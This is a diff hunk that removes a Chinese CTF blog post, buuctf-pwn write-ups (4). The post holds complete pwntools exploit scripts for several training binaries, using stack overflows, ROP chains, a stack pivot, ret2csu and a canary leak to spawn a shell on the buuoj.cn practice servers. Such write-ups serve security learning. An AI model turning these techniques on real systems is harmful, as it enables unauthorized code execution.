@@ -150,134 +150,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's Pwnhome">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/28/buuctf-pwn-write-ups-4/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (4)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-02-28 22:07:00 / Modified: 23:20:26" itemprop="dateCreated datePublished" datetime="2023-02-28T22:07:00+08:00">2023-02-28</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span></span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>NaN:aN</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="buu032-ez_pz_hackover_2016"><a class="markdownIt-Anchor" href="#buu032-ez_pz_hackover_2016"></a> buu032-ez_pz_hackover_2016</h1>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">chall</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-40Ch] BYREF</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">1023</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(s, <span class="number">10</span>, v0);                       <span class="comment">// 将中间的换行符换成空字节</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, s);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(s, <span class="string">&quot;crashme&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> vuln((<span class="type">char</span>)s, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>chall函数中打印了一个地址，但是没啥用，不给也能做。</p>
-<p>本题一个考察的重点就是fgets函数，这个函数遇到换行输入会截断，但是空字节不会，因此可以在crashme后面加一个空字节，后面仍然能输入我们的payload，绕过检查。<br />
-<img src="https://img-blog.csdnimg.cn/eb5d2917bde445c28a8bde35db106aec.png" alt="" /><br />
-需要注意的是memcpy的src起始地址并不是crashme的地址，而是crashme的二重指针，也就是说复制之后dest的值并不是crashme。这个地址在crashme的前面，因此需要添加的无效字节数量需要经过计算。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28953</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span></span><br><span class="line">payload += cyclic(<span class="number">2</span> + <span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;chall&#x27;</span>])</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;crashme!\n&#x27;</span>)</span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span></span><br><span class="line">payload += cyclic(<span class="number">2</span> + <span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0xdeadeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="buu033-picoctf_2018_rop-chain"><a class="markdownIt-Anchor" href="#buu033-picoctf_2018_rop-chain"></a> buu033-picoctf_2018_rop chain</h1>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29541</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;win_function1&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;win_function2&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Enter your input&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="buu034-black-watch-入群题pwn"><a class="markdownIt-Anchor" href="#buu034-black-watch-入群题pwn"></a> buu034-[Black Watch 入群题]PWN</h1>
-<p>bss段给了一大块空间，推测考察栈迁移。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>最后一个read的溢出只能覆盖返回地址，因此是栈迁移无疑，将栈转移到bss段。<br />
-本题要明确leave指令的作用，其相当于’mov esp, ebp; pop ebp’。我们传入的第一个payload在bss段上，作为伪造的栈区备用；第二个payload中，我们修改了ebp处的值为bss段地址，但此时esp仍然在原来的栈上，不过我们可以将返回地址写到’leave’指令，让程序再一次执行leave指令，由于此时ebp已经被修改为bss段地址，因此此时esp就被成功修改。注意后面的pop ebp指令中pop出来的值已经是bss段上的值了。</p>
-<p>在pop之后，esp应指向s+4的位置，这里我们写入write函数读取libc基地址，然后返回到vul_function中，因为vul_function中能够直接在s中写入很多字节，因此就相当于我们直接修改ebp后面的返回地址。将获取的system函数和’/bin/sh’字符串地址写入即可getshell。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29191</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake stack</span></span><br><span class="line">payload = p32(elf.symbols[<span class="string">&#x27;m1&#x27;</span>] + <span class="number">20</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;vul_function&#x27;</span>])	<span class="comment"># return address, return to function</span></span><br><span class="line">payload += p32(<span class="number">1</span>)					<span class="comment"># first argument of write: stdout</span></span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;write&#x27;</span>])	<span class="comment"># second argument of write: .got address of &#x27;write&#x27;</span></span><br><span class="line">payload += p32(<span class="number">4</span>)					<span class="comment"># third argument of write: write length</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What is your name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;s&#x27;</span>])	<span class="comment"># fake ebp</span></span><br><span class="line">payload += p32(<span class="number">0x8048511</span>)			<span class="comment"># return to &#x27;leave; retn&#x27; to change rsp into .bss segment</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;What do you want to say?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write)</span><br><span class="line">base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># we can change the stack after ebp directly through &#x27;vul_function&#x27;</span></span><br><span class="line"><span class="comment"># now the ebp points to s+8, so fill 12 bytes of garbage into s first</span></span><br><span class="line">payload = p32(<span class="number">0xdeadbeef</span>) * <span class="number">3</span></span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What is your name?&#x27;</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What do you want to say?&#x27;</span>, <span class="string">b&#x27;Hacked&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="buu035-jarvisoj_level4"><a class="markdownIt-Anchor" href="#buu035-jarvisoj_level4"></a> buu035-jarvisoj_level4</h1>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26702</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">136</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">read = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read)</span><br><span class="line">base = read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">136</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="buu036-jarvisoj_level3_x64"><a class="markdownIt-Anchor" href="#buu036-jarvisoj_level3_x64"></a> buu036-jarvisoj_level3_x64</h1>
-<p>典型的ret2csu，与RopEmporium的最后一题利用方式高度一致。<br />
-注意第一个payload里面的0x600890保存的实际是sub rsp,8 ; add rsp,8 ; ret的地址。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28787</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">poprsir15_ret = <span class="number">0x4006b1</span></span><br><span class="line">movrdxr13 = <span class="number">0x400690</span></span><br><span class="line">pop6_ret = <span class="number">0x4006aa</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">128</span> + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop6_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)			<span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)			<span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0x600890</span>)	<span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">8</span>)			<span class="comment"># r13</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])	<span class="comment"># r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)			<span class="comment"># r15</span></span><br><span class="line"></span><br><span class="line">payload += p64(movrdxr13)	<span class="comment"># mov rdx, r13; mov rsi, r14; mov edi, r15d</span></span><br><span class="line"><span class="comment"># then call &#x27;pop rdi, ret&#x27;</span></span><br><span class="line"><span class="comment"># payload += p64(1)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># at this time, rdi = 1, rsi = addr(got[&#x27;read&#x27;]), rdx = 4</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">read = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read)</span><br><span class="line">base = read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">128</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="buu037-bjdctf_2020_babyrop2"><a class="markdownIt-Anchor" href="#buu037-bjdctf_2020_babyrop2"></a> buu037-bjdctf_2020_babyrop2</h1>
-<p>用gdb调试发现本题环境中所有函数的canary都相同，于是首先泄露canary然后栈溢出完事。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400993</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25313</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;I\&#x27;ll give u some gift to help u!\n&#x27;</span>, <span class="string">b&#x27;%7$llx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>, payload)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="buu038-pwnable_orw"><a class="markdownIt-Anchor" href="#buu038-pwnable_orw"></a> buu038-pwnable_orw</h1>
-<p>就是写入shellcode。这道题中有一个seccomp函数，在其中调用了两次prctl函数。具体的功能是禁止用户调用某些系统调用。下面是程序中的片段：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="number">12</span>;</span><br><span class="line">v2 = v3;</span><br><span class="line">prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br></pre></td></tr></table></figure>
-<p>可以看到调用了两次prctl函数，第一个参数是option，表明具体的功能。<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.17.10/source/include/uapi/linux/prctl.h#L68">查询linux源码</a>可知，选项22和38分别代表以下意思：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP	22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS	38</span></span><br></pre></td></tr></table></figure>
-<p>38表示禁止提权，而22则为设定SECCOMP保护。<br />
-当prctl第一个参数为22时，实际上调用了prctl_set_seccomp函数。找到其定义：</p>
